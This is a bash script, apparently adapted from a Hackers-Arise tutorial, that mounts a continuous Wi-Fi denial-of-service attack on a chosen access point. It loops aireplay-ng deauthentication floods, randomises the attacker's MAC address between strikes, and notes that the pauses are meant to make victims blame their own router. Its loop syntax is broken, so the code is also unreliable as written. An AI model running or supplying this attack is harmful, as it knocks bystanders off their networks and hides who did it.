#! /bin/bash
# FOR EDUCATIONAL PURPOSES ONLY
# This is continous Dos a wireless AP
# Based on this article from Hackers-Arise
# https://www.hackers-arise.com/post/bash-scripting-for-hackers-part-2-building-a-continuous-wi-fi-denial-of-service-tool
# Some APs will not allow this, and you will have to rerun this script with the individual MAC addresses you want to de-authenticate.

# Closes any process that could cause trouble once the wireless adapter is in monitor mode
sudo airmon-ng check kill

# identify the enemy's BSSID and copy it!

sudo airodump-ng wlan0mon

# set the BSSID you wish to target

echo "Enter the BSSID you wish to target. :"

# sets the BSSID as a variable
read BSSID

# set the number of times you wish to run the loop

echo "Enter the number of times you wish to run the attack :"

# sets the loop variable 

read LOOP

# Sets how many deauth frame will be send in each attack in the loop

echo "How many deauth frames (the default is continous which is not recommended, 100 is recommended) do you want to send out each strike :"

# sets the deauth Variable

read DEAUTH

# sets how many seconds you want to sleep in between each attach

echo "How many seconds do you want to wait in between each strike :"

# sets the sleep variable 

read SLEEP

# Creates a for loop that will execute our commands how many times the user specified.
for i {1..$LOOP}

# Contains the commands we want to execute. Everything after the do and before the done will be executed in each loop
do

# Changes the MacAddress between executions 
	sudo macchanger -r wlan0
 
# Sends the deauth frames 100 times (the default is continuous) to the MAC address of the AP (-a) from the interface wlan0mon.
	sudo aireplay-ng --deauth $DEAUTH -a $BSSID wlan0mon
 
# Tells the script to sleep for 60 seconds. In this way, the clients will be able to re-authenticate for 60 seconds before you send another deauth flood. 
# Hopefully, this short interval will lead them to believe that the problem is with their AP and not you.
	sleep $SLEEP
 
# closes the for loop.	
done
